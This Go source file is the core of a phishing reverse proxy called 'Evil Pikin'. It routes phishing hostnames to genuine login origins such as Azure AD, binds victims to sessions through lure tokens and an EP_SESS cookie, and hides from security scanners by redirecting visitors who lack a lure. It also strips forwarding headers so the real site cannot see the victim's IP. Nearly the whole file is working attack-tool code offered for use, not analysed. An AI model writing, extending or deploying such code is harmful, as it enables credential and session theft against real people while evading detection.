// Package proxy implements the dynamic reverse-proxy core. Unlike a traditional
// router that matches on URL path, Evil Pikin routes on the incoming Host header
// (or SNI once terminated by the TLS layer): every phishing host is looked up in
// the RuntimeConfig target map and proxied to its real upstream origin.
package proxy

import (
	"crypto/tls"
	"net"
	"net/http"
	"net/http/httputil"
	"net/url"
	"strings"
	"sync"
	"time"

	"github.com/user/evilpikin/pkg/config"
	"github.com/user/evilpikin/pkg/lures"
)

// ProxyEngine routes incoming HTTP requests to upstreams based on req.Host.
type ProxyEngine struct {
	cfg *config.RuntimeConfig

	// Scheme is the upstream protocol. It defaults to "https" for production
	// interception; tests against plaintext httptest servers override it.
	Scheme string

	// Lures, when set, enables the tracking-matrix guard: requests carrying a
	// valid lure token are bound to a session; with RequireLure enabled, any
	// request lacking a token AND an EP_SESS cookie is bounced to SafeRedirectURL.
	Lures *lures.Registry
	// RequireLure forces every request through a valid lure (scanner evasion).
	RequireLure bool
	// SafeRedirectURL is where unauthorized crawlers are sent. Empty => google.
	SafeRedirectURL string
	// LureParam is the query parameter carrying the lure token (default "id").
	LureParam string

	mu      sync.Mutex
	proxies map[string]*httputil.ReverseProxy // keyed by upstream origin host
}

// NewProxyEngine builds an engine bound to the shared runtime config.
func NewProxyEngine(cfg *config.RuntimeConfig) *ProxyEngine {
	return &ProxyEngine{
		cfg:     cfg,
		Scheme:  "https",
		proxies: make(map[string]*httputil.ReverseProxy),
	}
}

// SetLures attaches the lure registry and enables the tracking-matrix guard.
func (pe *ProxyEngine) SetLures(r *lures.Registry) { pe.Lures = r }

// SetRequireLure toggles scanner-evasion mode (unknown visitors get bounced).
func (pe *ProxyEngine) SetRequireLure(v bool) { pe.RequireLure = v }

func (pe *ProxyEngine) scheme() string {
	if pe.Scheme == "" {
		return "https"
	}
	return pe.Scheme
}

// ServeHTTP implements http.Handler. It first applies the lure tracking-matrix
// guard (when a registry is attached), then resolves the request host, builds
// (or reuses) a reverse proxy for the matched upstream, and forwards the request.
// Unmapped hosts are rejected with 404 so stray subdomains don't leak to a real
// site or expose the listener.
func (pe *ProxyEngine) ServeHTTP(w http.ResponseWriter, r *http.Request) {
	incoming := r.Host
	if h, _, err := net.SplitHostPort(incoming); err == nil {
		incoming = h
	}

	// --- Lure tracking-matrix guard -----------------------------------------
	var active *lures.Lure
	if pe.Lures != nil {
		param := lures.ParamName(pe.LureParam)
		if l, ok := pe.Lures.Validate(r.URL.Query().Get(param)); ok {
			active = l
		}
		if pe.RequireLure && active == nil && !lures.HasSessionCookie(r) {
			// No valid lure token and no prior session: bounce the crawler to a
			// benign page so the server stays hidden.
			lures.SafeRedirect(w, r, pe.SafeRedirectURL)
			return
		}
		if active != nil {
			// First touch: drop the EP_SESS cookie and bind it to this lure's
			// target profile. Strip the token before forwarding upstream.
			domain, _, _, _ := pe.cfg.Snapshot()
			tok := lures.SetSessionCookie(w, r, domain)
			pe.Lures.BindSession(tok, active.ID, active.TargetProfile, lures.ClientIP(r), r.UserAgent())
			lures.StripParam(r, param)
			// Rewrite the deceptive serve path to the real upstream landing path
			// so the origin serves a genuine page instead of 404'ing. When no
			// explicit LandingPath is set the live engine resolves the target's
			// redirect_url; this mirror applies the explicit override.
			if landing := active.LandingPath; landing != "" {
				if strings.HasPrefix(landing, "/") {
					r.URL.Path = landing
				} else if u, err := url.Parse(landing); err == nil && u.Path != "" {
					r.URL.Path = u.Path
					if u.RawQuery != "" {
						q := r.URL.Query()
						for k, vs := range u.Query() {
							for _, v := range vs {
								q.Add(k, v)
							}
						}
						r.URL.RawQuery = q.Encode()
					}
				}
				r.URL.RawPath = ""
			}
		}
	}

	upstream, ok := pe.cfg.TargetFor(incoming)
	if !ok && active != nil {
		// A valid lure may unlock a target profile keyed by name rather than the
		// raw host (e.g. when the lure path drives routing).
		upstream, ok = pe.cfg.TargetFor(active.TargetProfile)
	}
	if !ok {
		http.Error(w, "Not Found", http.StatusNotFound)
		return
	}

	pe.proxyFor(upstream).ServeHTTP(w, r)
}

// proxyFor returns a cached reverse proxy for an upstream origin, building it on
// first use. Caching avoids allocating a new ReverseProxy (and re-parsing the URL)
// on every request.
func (pe *ProxyEngine) proxyFor(upstream string) *httputil.ReverseProxy {
	pe.mu.Lock()
	defer pe.mu.Unlock()
	if p, ok := pe.proxies[upstream]; ok {
		return p
	}

	targetURL, err := url.Parse(pe.scheme() + "://" + upstream)
	if err != nil {
		// Upstream values come from operator config; surface a 502 rather than
		// panicking in the hot path.
		return erroringProxy(err)
	}

	p := httputil.NewSingleHostReverseProxy(targetURL)
	// Hardened outbound transport: explicitly set the upstream SNI (ServerName)
	// and browser-style ALPN so strict CDN / enterprise edges (e.g. Microsoft
	// Front Door / Azure AD) accept the handshake instead of sending a FIN/RST
	// that surfaces on the client as a blank page / EOF.
	inner := &http.Transport{
		DialContext: (&net.Dialer{
			Timeout:   10 * time.Second,
			KeepAlive: 30 * time.Second,
		}).DialContext,
		TLSHandshakeTimeout:   10 * time.Second,
		ResponseHeaderTimeout: 20 * time.Second,
		IdleConnTimeout:       90 * time.Second,
		ExpectContinueTimeout: 1 * time.Second,
		ForceAttemptHTTP2:     true,
		TLSClientConfig: &tls.Config{
			ServerName: targetURL.Host, // MUST equal the upstream host for SNI
			NextProtos: []string{"h2", "http/1.1"},
		},
	}
	// The forwarding headers are stripped in a Transport wrapper (NOT the
	// Director): httputil.ReverseProxy re-adds X-Forwarded-For with the client
	// IP *after* the Director runs, so only a Transport can guarantee removal
	// before the bytes hit the wire.
	p.Transport = &stripTransport{inner: inner}
	original := p.Director
	p.Director = func(req *http.Request) {
		original(req)
		// Present the real origin host to the upstream (not the phishing host).
		req.URL.Scheme = pe.scheme()
		req.URL.Host = targetURL.Host
		req.Host = targetURL.Host
	}
	pe.proxies[upstream] = p
	return p
}

// stripTransport deletes hop-by-hop / forwarding headers immediately before the
// request is sent. This is the only reliable place to remove X-Forwarded-For,
// because httputil.ReverseProxy re-injects it after the Director executes.
type stripTransport struct {
	inner http.RoundTripper
}

func (s *stripTransport) RoundTrip(req *http.Request) (*http.Response, error) {
	req.Header.Del("Forwarded")
	req.Header.Del("X-Forwarded-For")
	req.Header.Del("X-Forwarded-Host")
	return s.inner.RoundTrip(req)
}

// erroringProxy returns a handler that always responds 502 with the given error.
// It is only used when an upstream value is malformed.
func erroringProxy(err error) *httputil.ReverseProxy {
	bad := &url.URL{Scheme: "http", Host: "localhost"}
	p := httputil.NewSingleHostReverseProxy(bad)
	p.Director = func(req *http.Request) {}
	p.ErrorHandler = func(w http.ResponseWriter, r *http.Request, e error) {
		http.Error(w, "bad gateway: "+e.Error(), http.StatusBadGateway)
	}
	_ = err
	return p
}

// Start binds the engine to addr and serves until the process exits.
func (pe *ProxyEngine) Start(addr string) error {
	srv := &http.Server{Addr: addr, Handler: pe}
	return srv.ListenAndServe()
}

// NewRuntimeRouter returns the top-level http.Handler that multiplexes traffic
// across every target/lure registered in reg, using the compound (host, token)
// index. The returned handler is simply reg itself, since RuntimeRegistry
// already implements http.Handler. It is provided so callers can express intent
// at the listen boundary:
//
//	srv := &http.Server{Addr: addr, Handler: proxy.NewRuntimeRouter(reg)}
func NewRuntimeRouter(reg *RuntimeRegistry) http.Handler { return reg }
